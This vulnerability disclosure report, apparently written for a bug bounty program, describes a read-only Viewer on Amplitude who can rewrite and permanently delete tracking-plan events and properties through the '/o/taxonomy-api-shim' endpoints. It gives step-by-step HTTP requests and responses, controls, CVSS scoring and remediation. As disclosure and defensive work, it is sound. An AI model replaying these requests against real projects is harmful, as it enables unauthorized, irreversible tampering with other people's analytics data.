# Amplitude Data taxonomy shim — the read-only Viewer can rewrite and delete the project's tracking plan (`/o/taxonomy-api-shim/*`)

**Severity:** CVSS 7.1 (High) — `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L`
**Tenant:** org `464637` (`agentmail-602393`), app `862908` — our own tenant only. VIEWER `mohamed-9499-2+member@agentmail.to` (`orgRole 1`, `appRoles: null`); ORG_ADMIN `mohamed-9499-3@agentmail.to` (`orgRole 4`, `appRoles: null`).

## Summary

`/o/taxonomy-api-shim/*` on `app.amplitude.com` is the session-authenticated REST shim the shipped Data / llm-analytics clients use to edit the tracking plan, and it carries `PUT` and `DELETE` for planned **events** and planned **event properties**. The shim authenticates the caller and validates that the body `appId` is a project the caller can reach — but it never evaluates the role permission that governs tracking-plan changes. An authenticated **Viewer** (`orgRole 1`, the lowest non-zero role in Amplitude, whose own permission table grants it *no* Data-app permissions at all) is therefore accepted on every write and delete verb. The Org-Admin control returns byte-equivalent responses with identical persistence, which is what makes this an authorization result rather than an endpoint failure. The shim's own `GET /o/taxonomy-api-shim/info?appId=` endpoint *is* a permission signal — it returns `{"readOnly": …, "readOnlyReason": …}` and answers `readOnlyReason: "Insufficient permissions"` for an app the caller cannot reach — yet for a Viewer on its own project it returns `readOnly: false`. The `DELETE` verb is used by no shipped client (both bundles only ever issue `PUT`), and there is no restore verb on the shim, so the role that can destroy a planned event type cannot undo it.

Decisive measured transition:

```
VIEWER  PUT    /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer -> 200 {"success":true}
        read-back via the project-key REST taxonomy                   -> description PERSISTED
ORG_ADMIN same call                                                   -> 200 {"success":true}  (identical)

VIEWER  DELETE /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer -> 200 {"success":true}
        read-back                                                   -> 400 "Not found"  (destroyed)
ORG_ADMIN same call                                                   -> 200 {"success":true}  (identical)
```

Read-back runs over the **project-key REST taxonomy** (`/api/2/taxonomy/*`, HTTP Basic `{apiKey}:{secretKey}`) — a different credential plane from the session-authenticated shim, so a persisted change cannot be explained by client state, caching or optimistic UI.

## Repro

Roles verified live in this run:

```
POST /t/graphql/org/464637?q=OrgData
{"query":"query OrgData { apps { id name apiKey secretKey } currentUser { loginId orgRole } }"}

VIEWER    -> 200 {"currentUser":{"loginId":"mohamed-9499-2+member@agentmail.to","orgRole":1},
                  "apps":[{"id":"862908",…,"secretKey":null}]}
ORG_ADMIN -> 200 {"currentUser":{"loginId":"mohamed-9499-3@agentmail.to","orgRole":4},
                  "apps":[{"id":"862908",…,"secretKey":"a6bbcc1f2e…32be"}]}

POST /t/graphql/org/464637?q=ProductPermissionOwnRole   {"product":"analytics"}
VIEWER    -> 200 {"productPermissionOwnRole":{"orgRole":1,"appRoles":null}}
ORG_ADMIN -> 200 {"productPermissionOwnRole":{"orgRole":4,"appRoles":null}}
```

`appRoles: null` for both — the Viewer has no app-level role elevation, so `orgRole 1` is the effective role. (`orgRole` enum, from the shipped stargate bundle: `NONE=0, VIEWER=1, MEMBER=2, MANAGER=3, ORG_ADMIN=4, AMP_ADMIN=5`.)

**1. The shim's own permission flag is permission-derived — and wrong for the Viewer.**

```
GET /o/taxonomy-api-shim/info?appId=862908 HTTP/1.1
Host: app.amplitude.com
Cookie: <VIEWER session>
x-csrf-token: 1

HTTP/1.1 200
{"success": true, "data": {"readOnly": false, "readOnlyReason": null, "isVersionedApp": true}}
```

The same call as the Org Admin returns the identical body. The flag is a *permission* signal, not a constant — for an app the caller cannot reach:

```
GET /o/taxonomy-api-shim/info?appId=999999999   (VIEWER)
-> 200 {"success": true, "data": {"readOnly": true, "readOnlyReason": "Insufficient permissions"}}

GET /o/taxonomy-api-shim/info                   (VIEWER, no appId)
-> 200 {"success": true, "data": {"readOnly": true, "readOnlyReason": "Insufficient permissions"}}
```

**2. Create throwaway objects so the write is observable (project key).**

```
POST /api/2/taxonomy/category HTTP/1.1
Host: amplitude.com
Authorization: Basic {apiKey}:{secretKey}
Content-Type: application/x-www-form-urlencoded

category_name=hermes_taxshim_verify_cat
-> 200 {"success": true}

POST /api/2/taxonomy/event
event_type=hermes_taxshim_verify_viewer&category=hermes_taxshim_verify_cat&description=baseline-viewer-desc
-> 200 {"success": true}
```

**3. Owner control — the Org Admin writes through the shim.**

```
PUT /o/taxonomy-api-shim/event/hermes_taxshim_verify_admin HTTP/1.1
Host: app.amplitude.com
Cookie: <ORG_ADMIN session>
x-csrf-token: 1
Content-Type: application/json

{"appId":"862908","description":"hermes_admin_write_probe","category":"hermes_taxshim_verify_cat"}

HTTP/1.1 200
{"success":true}

GET /api/2/taxonomy/event/hermes_taxshim_verify_admin    (project key)
-> 200 {"success":true,"data":{…,"description":"hermes_admin_write_probe",…}}      <- PERSISTED
```

**4. The finding — the same write as the Viewer.**

```
PUT /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer HTTP/1.1
Host: app.amplitude.com
Cookie: <VIEWER session>                    <- orgRole 1, appRoles null
x-csrf-token: 1
Content-Type: application/json

{"appId":"862908","description":"hermes_viewer_write_probe","category":"hermes_taxshim_verify_cat"}

HTTP/1.1 200
{"success":true}

GET /api/2/taxonomy/event/hermes_taxshim_verify_viewer   (project key)
-> 200 {"success":true,"data":{"event_type":"hermes_taxshim_verify_viewer",
                               "description":"hermes_viewer_write_probe", …}}       <- PERSISTED
```

Byte-for-byte the same `200 {"success":true}` the Org Admin received, and the same persistence.

**5. The finding — the Viewer destroys a planned event type.**

```
DELETE /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer HTTP/1.1
Host: app.amplitude.com
Cookie: <VIEWER session>
x-csrf-token: 1
Content-Type: application/json

{"appId":"862908"}

HTTP/1.1 200
{"success":true}

GET /api/2/taxonomy/event/hermes_taxshim_verify_viewer   (project key)
-> 400 {"success":false,"errors":[{"message":"Not found"}]}          <- the event type is GONE
```

The Org Admin's identical `DELETE` on a second planned event produced the same `200` and the same `400 "Not found"` read-back, so the verb itself is functional for a permitted role.

**6. The property route behaves the same way.**

```
PUT /o/taxonomy-api-shim/event-property/hermes_taxshim_verify_prop
Cookie: <VIEWER session>
{"appId":"862908","description":"hermes_viewer_prop_probe","category":null}
-> 200 {"success":true}
GET /api/2/taxonomy/event-property/hermes_taxshim_verify_prop?event_type=hermes_taxshim_verify_propev
-> 200 {…"description":"hermes_viewer_prop_probe"…}                  <- PERSISTED

DELETE /o/taxonomy-api-shim/event-property/hermes_taxshim_verify_prop
Cookie: <VIEWER session>
{"appId":"862908"}
-> 200 {"success":true}
GET (same read-back) -> 400 {"success":false,"errors":[{"message":"Not found"}]}   <- destroyed
```

**7. There is no restore path for the role that did the deleting.**

```
POST /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer/restore   (VIEWER)
-> 404 {"success":false,"errors":[{"message":"Not found"}]}
PUT  /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer/restore   (VIEWER)
-> 404 {"statusCode":404,"message":"Cannot PUT /taxonomy-api-shim/event/…/restore","error":"Not Found"}
POST /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer           (VIEWER)
-> 404 {"statusCode":404,"message":"Cannot POST /taxonomy-api-shim/event/…","error":"Not Found"}
```

The shim exposes only `PUT` and `DELETE` for `event/{event}` — no create, no restore. The only restore primitive is on the project-key REST surface (`/api/2/taxonomy/event/{type}/restore`), and the Viewer cannot obtain the project key: `OrgData` returns `secretKey: null` for `orgRole 1`. A Viewer's deletion is one-way for the Viewer.

**Controls**

```
# scoping control — body appId is validated against the caller's reachable projects on BOTH verbs
PUT    /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer   (VIEWER, body appId "999999999")
-> 403 {"success":false,"errors":[{"message":"Requested operation requires additional permissions."}]}
GET read-back -> the object is UNCHANGED
DELETE /o/taxonomy-api-shim/event/hermes_taxshim_verify_scope    (VIEWER, body appId "999999999")
-> 403 (same message)
GET read-back -> 200, the object SURVIVED
=> the bypass is strictly INSIDE a project the caller can already see, not a cross-project write

# fabricated object — the shim validates the object it is handed
PUT    /o/taxonomy-api-shim/event/hermes_taxshim_verify_nonexistent   (VIEWER, real appId)
-> 404 {"success":false,"errors":[{"message":"Attempted to update an event,
        \"hermes_taxshim_verify_nonexistent\", that is not a planned event."}]}
DELETE /o/taxonomy-api-shim/event/hermes_taxshim_verify_nonexistent   (VIEWER)
-> 404 {"success":false,"errors":[{"message":"Not found"}]}

# anonymous — the route is authenticated
PUT    /o/taxonomy-api-shim/event/…      (no session at all) -> 401 {"success":false,"errors":[{"message":"Unauthorized"}]}
DELETE /o/taxonomy-api-shim/event/…      (no session at all) -> 401 {"success":false,"errors":[{"message":"Unauthorized"}]}
GET    /o/taxonomy-api-shim/info?appId=862908 (no session)   -> 401 {"success":false,"errors":[{"message":"Unauthorized"}]}
```

So the route is authenticated, it validates the object it is handed, and the `200`s in steps 4–6 are real state changes — not a blanket `200` from an unguarded endpoint.

Cleanup verified by read-back: `GET /api/2/taxonomy/event` -> 8 (baseline 8, zero `hermes*` residue); `event-property` -> 35 (baseline 35, zero `hermes*`); `category` -> `[]`. No pre-existing tenant object was modified or deleted.

## Impact

The lowest non-zero role can rewrite the tracking plan — event descriptions, event categories and planned **event properties**, the Data product's core object — and the vendor's own MCP documentation says that object requires the *Update Tracking Plan* permission. It can also hold a working `DELETE` for planned event types, and the vendor documents the consequence in the product's own words: *"Deleting event types also blocks all future instances of events with the same name. If you send data to a deleted or blocked event name in Amplitude, the data doesn't come through."* / *"Ingested events and properties: Amplitude marks them as deleted and stops ingesting them."* Nothing in the responses distinguishes the Viewer's write from the Admin's — both are `200 {"success":true}` with identical bodies and no authorization decision surfaced — so a Viewer silently rewriting or deleting plan entries leaves no signal in the API responses. The write path also ignores the **version/branch dimension**: the app reports `isVersionedApp: true` and the bundle's own gate refuses edits off the default branch, yet the shim accepts the write and reports `readOnly:false` regardless.

**Ceiling.** No cross-tenant reach and no cross-project reach — the body `appId` is validated on both verbs and a foreign value returns `403 "Requested operation requires additional permissions."` with the object unchanged. No confidentiality impact: the shim exposes no data the Viewer could not already read. No PII and no credential. The `DELETE` verb is bounded inside the project and there is no restore path, which bounds the blast radius but also makes the damage permanent. Org `464637` holds exactly one app (`OrgData.apps = [862908]`), so a true cross-project test was not possible on this tenant; the fabricated-`appId` control is the substitute evidence. No other org was touched.

**CVSS terms and the measured fact behind each:**

| Term | Value | Support |
|---|---|---|
| `AV:N` | Network | the shim is reached over HTTPS on `app.amplitude.com` |
| `AC:L` | Low | one authenticated request; no race, no user interaction, no special condition |
| `PR:L` | Low | requires an authenticated session holding `orgRole 1` on the project |
| `UI:N` | None | the victim need not act |
| `S:U` | Unchanged | the bypass stays inside the caller's own project (`403` on a foreign `appId`) |
| `C:N` | None | no data the Viewer could not already read |
| `I:H` | High | measured: Viewer `PUT` -> `200 {"success":true}` and the description persisted on read-back through a different credential plane |
| `A:L` | Low | measured: Viewer `DELETE` -> `200 {"success":true}` and the object read back `400 "Not found"`; the ingestion-stopping consequence is the vendor's documented semantics of the delete action, **not** independently observed on this tenant |

If the availability term is disputed, the score drops to `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` = **6.5 (Medium)**; the integrity half of the finding does not depend on it.

## Remediation

Server-side, in the shim:

1. **Evaluate the tracking-plan permission on every state-changing verb.** Before touching the object, require the permission the client matrix uses — `CHANGE_TRACKING_PLANS` / Data-app `can-edit-taxonomy`, i.e. **Manager (3) and above** — for `PUT` **and** `DELETE` on `event/{event}`, `event-property/{property}` and `user-property/{property}`. A caller with `orgRole < 3` (or an app-level role override below Manager) must receive `403` **before** object lookup, matching the wording already used for the `appId` check.
2. **Derive `info.readOnly` from the same predicate.** `GET /o/taxonomy-api-shim/info` must compute `readOnly` / `readOnlyReason` from `can-edit-taxonomy` rather than from app membership, so the value the client gates its editor on matches the value the write path enforces. The stargate bundle's own `CanEditTaxonomy → readOnly/readOnlyReason` mapping is the reference implementation.
3. **Treat `DELETE` as privileged or remove it.** The verb is not used by any shipped client and it is the destructive one; if it is retained for internal callers it must be gated at Manager+ (or restricted to a server-to-server credential), and it should record an audit entry naming the caller and the object.
4. **Regression test:** walk the shim's route table with a Viewer session and assert `403` on every non-`GET` route, plus a positive test that a Manager session still succeeds. Add the same assertion to the `info` flag.

**Sibling routes / shared root cause:** the client's own matrix (`CHANGE_TRACKING_PLANS:{1:!1,2:!0,3:!0,4:!0}`, labelled `"Update Tracking Plan"`) and the Data app's own permission table (`VIEWER -> []`; `can-edit-taxonomy` from MANAGER up) define one policy across `event`, `event-property` and `user-property`. The fix is therefore **one predicate applied across the shim's write verbs**, not three separate fixes — but it is a *different* predicate, on a different route prefix, from the Guides & Surveys finding, and neither fix closes the other.

**Not a duplicate of `SUBMISSION-GS-AUTHZ.md`.** That report is the Django REST viewsets for guides, surveys, themes, collections and syncs (`/a/`, `/h/`); nothing in this finding touches `/a/` or `/h/`. This is a different route prefix (`/o/taxonomy-api-shim/*`), a different object (the tracking plan, with a destructive `DELETE` verb and no restore) and a different fix. If the program prefers to treat "the lowest-privilege role is not checked on a write route" as one root cause, this shim report should be folded into `SUBMISSION-GS-AUTHZ.md` as an **additional impact** rather than closed as a duplicate. Also distinct: `c1f935a8` (Developer API Viewer escalation) — different asset, authorization by OAuth scope string, no OAuth token involved here; the Global Agent IDOR (`/fed/graphql`) — different asset entirely; and the already-recorded `uploadTaxonomy` observation — same class, but that write was refused for *every* role by a read-only DB transaction, whereas **here the write executes and persists** and the destructive verb works.

---
Evidence: escal/taxshim_raw.txt, escal/taxshim_results.json, escal/taxshim_p1_baseline.json, escal/taxshim_p2_write.json, escal/taxshim_p3_delete.json, escal/taxshim_p4a_property.json, escal/taxshim_p4b_cleanup.json, escal/taxshim_p5_final.json, escal/taxshim_p6_restore.json, escal/taxshim_h.py, FINDINGS/LEDGER.md
